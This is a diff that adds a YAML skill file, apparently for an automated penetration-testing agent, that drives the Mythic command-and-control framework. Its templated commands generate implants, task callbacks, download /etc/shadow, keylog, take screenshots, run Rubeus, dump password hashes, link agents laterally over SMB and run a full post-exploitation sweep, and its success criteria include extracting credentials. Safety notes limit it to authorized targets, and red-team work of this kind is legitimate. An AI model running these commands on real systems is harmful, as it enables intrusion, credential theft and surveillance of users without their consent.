@@ -1,0 +1,153 @@
+id: mythic_c2
+name: Mythic C2 Framework
+category: post_exploitation
+phase: EXPLOIT
+priority: 92
+target_types:
+  - lab
+  - external
+description: >
+  Mythic is a cross-platform, multiplayer C2 framework with a GraphQL API,
+  plug-n-play agent architecture, and collaborative web UI.  Use the Mythic
+  Scripting PyPi package (`mythic`) or direct GraphQL/REST calls for:
+  payload generation (Apollo/.NET for Windows, Poseidon/Go for Linux/macOS,
+  Medusa/Python cross-platform), callback management, task execution,
+  file browsing, credential harvesting, SOCKS proxying, P2P agent linking,
+  screenshot capture, keylogging, token manipulation, .NET assembly execution,
+  and BOF loading.  Mythic tracks MITRE ATT&CK mappings, artifacts, and
+  operational security concerns automatically.
+tags:
+  - c2
+  - mythic
+  - apollo
+  - poseidon
+  - medusa
+  - post-exploitation
+  - persistence
+  - lateral-movement
+  - graphql
+  - red-team
+mitre_techniques:
+  - T1059.001  # PowerShell (Apollo)
+  - T1059.004  # Unix Shell (Poseidon)
+  - T1059.006  # Python (Medusa)
+  - T1071.001  # Application Layer Protocol: Web Protocols
+  - T1071.002  # Application Layer Protocol: File Transfer Protocols
+  - T1573      # Encrypted Channel
+  - T1105      # Ingress Tool Transfer
+  - T1021      # Remote Services
+  - T1055      # Process Injection
+  - T1003      # OS Credential Dumping
+  - T1003.001  # LSASS Memory
+  - T1003.002  # Security Account Manager
+  - T1134      # Access Token Manipulation
+  - T1547      # Boot or Logon Autostart Execution
+  - T1570      # Lateral Tool Transfer
+  - T1572      # Protocol Tunneling
+  - T1090      # Proxy (SOCKS)
+  - T1113      # Screen Capture
+  - T1056.001  # Input Capture: Keylogging
+  - T1005      # Data from Local System
+  - T1046      # Network Service Discovery
+  - T1218      # System Binary Proxy Execution (execute_coff / BOF)
+inputs:
+  - access.json
+  - services.json
+  - tech_fingerprint.json
+outputs:
+  - c2_session.json
+  - credentials.json
+  - evidence.json
+  - findings.json
+prerequisites:
+  - access
+tools:
+  - python3
+  - curl
+  - mythic-cli
+evidence_collection:
+  - Mythic server status and version
+  - Payload generation output (agent type, UUID, build parameters)
+  - C2 profile configuration (HTTP/SMB/TCP)
+  - Callback confirmation (callback ID, host, user, PID)
+  - Task execution results with MITRE ATT&CK tags
+  - Credential material extracted
+  - File browser captures
+  - Screenshot images
+  - Keylog data
+  - SOCKS proxy confirmation
+  - P2P link status
+commands:
+  # All commands use the Mythic GraphQL API via curl or the `mythic` PyPi package.
+  # MYTHIC_URL and MYTHIC_API_KEY must be set in the environment.
+  create_payload_apollo: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action create-payload --agent apollo --os windows --arch x64 \
+      --c2-profile http --json
+  create_payload_poseidon: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action create-payload --agent poseidon --os linux --arch amd64 \
+      --c2-profile http --json
+  create_payload_medusa: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action create-payload --agent medusa --os python \
+      --c2-profile http --json
+  list_callbacks: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action list-callbacks --json
+  issue_task: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action task --callback-id {callback_id} \
+      --command shell --params "whoami" --json
+  get_task_output: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action task-output --task-id {task_id} --json
+  start_socks: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action start-socks --callback-id {callback_id} --port 1080 --json
+  file_browser: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action file-browser --callback-id {callback_id} --path "/" --json
+  download_file: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action download --callback-id {callback_id} \
+      --remote-path "/etc/shadow" --json
+  screenshot: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action screenshot --callback-id {callback_id} --json
+  keylog: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action keylog --callback-id {callback_id} --json
+  execute_assembly: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action execute-assembly --callback-id {callback_id} \
+      --assembly Rubeus.exe --assembly-args "triage" --json
+  execute_bof: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action execute-bof --callback-id {callback_id} \
+      --bof-file whoami.x64.o --bof-function go --json
+  hashdump: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action hashdump --callback-id {callback_id} --json
+  link_agent: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action link --callback-id {callback_id} \
+      --link-host {target_host} --link-c2 smb --json
+  post_exploit_all: |
+    python3 /opt/tazosploit/scripts/mythic_c2.py \
+      --action post-exploit-all --callback-id {callback_id} \
+      --output-dir /pentest/output/$JOB_ID --json
+success_criteria:
+  - Mythic server reachable and API authenticated
+  - Payload generated for correct target OS/arch
+  - Callback received and interactive
+  - Post-exploitation tasks execute and return results
+  - Credentials or sensitive data extracted where possible
+  - Evidence artifacts saved to output directory
+safety_notes:
+  - Only deploy payloads to explicitly authorized targets
+  - Use HTTPS C2 profiles for external engagements
+  - Clean up callbacks and payloads after engagement
+  - Credential material must be encrypted at rest
+  - Never upload payloads to VirusTotal
+  - Mythic runs as sidecar — do NOT install inside the Kali container
